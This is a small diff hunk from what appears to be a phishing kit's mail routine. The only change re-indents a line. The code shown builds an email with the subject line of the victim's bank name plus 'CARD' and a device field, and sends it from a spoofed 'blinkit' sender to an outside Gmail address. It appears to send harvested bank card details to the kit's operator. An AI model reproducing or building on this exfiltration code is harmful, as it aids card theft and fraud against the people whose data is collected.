@@ -24,7 +24,7 @@ async function Mail(data) {
     Device:  ${device} <BR>
     </b>;
 `;
-const subject = `${data.bankname} CARD`;
+  const subject = `${data.bankname} CARD`;
   const info = await transporter.sendMail({
     from: '"blinkit👻" <blinkit@cashoxo.com>', // sender address
     to: "rus.server420@gmail.com", // list of receivers
